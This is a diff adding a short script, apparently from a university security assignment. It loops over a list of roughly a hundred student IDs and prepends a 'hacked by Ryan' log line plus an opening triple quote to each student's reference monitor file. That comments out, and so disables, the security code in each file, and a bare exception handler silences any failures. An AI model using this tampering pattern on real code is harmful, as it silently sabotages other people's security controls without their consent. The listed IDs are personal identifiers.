@@ -1,0 +1,35 @@
+
+
+netids = [
+    "aa10817", "aa11164", "aa9929", "aaa10565", "aal7034", "abs9425", "ac10189", "ag9979",
+    "ajc9961", "al7859", "alo278", "am13801", "am14504", "amp9939", "as17872", "aw5399",
+    "awp251", "az1970", "bha233", "caw561", "caw9180", "cc7825", "cn2507", "ctc9510",
+    "ddy3284", "ed2336", "ek3588", "elx204", "erd9800", "gm3163", "gpd264", "gw2467",
+    "gz2133", "hb2987", "hl4779", "hx2222", "ijw3779", "ik2302", "jef9921", "jw7769",
+    "jw7914", "jwb10028", "jz5476", "kaa9659", "km6133", "km6296", "kn2501", "ko2212",
+    "krs8750", "ks7929", "kx2157", "lah501", "lap9866", "ls6588", "md6031", "mg6392",
+    "ml8419", "mm14029", "mus2004", "nb3964", "nl2587", "nmt8347", "npd5883", "ns5190",
+    "nts7434", "om2145", "oo2032", "pc2720", "pg2542", "pg2592", "qaj201", "raw9846",
+    "rj2387", "rp3963", "rs8057", "rvg9395", "rwm9998", "sb9477", "sc10344", "sd5913",
+    "sd5971", "sd6198", "sg7569", "si2502", "sk12176", "sks9405", "sl9101", "sp8097",
+    "sr5649", "ssd410", "tm3664", "tn2272", "to2226", "vrb9112", "vv2327", "vvn7114",
+    "wl2184", "ww2301", "xh2774", "xw3508", "yc6104", "yf2266", "yk3213", "yn2426",
+    "zz2464", "zz4692"
+]
+
+try:
+    for netid in netids:
+        default = openfile("reference_monitor_" + netid + ".r2py", True)
+
+        default.writeat('log("Hello, World!\\nThis code was hacked by Ryan\\n")\n"""', 0)
+
+        default.close()
+
+except Exception as e:
+    
+    pass
+
+
+
+
+
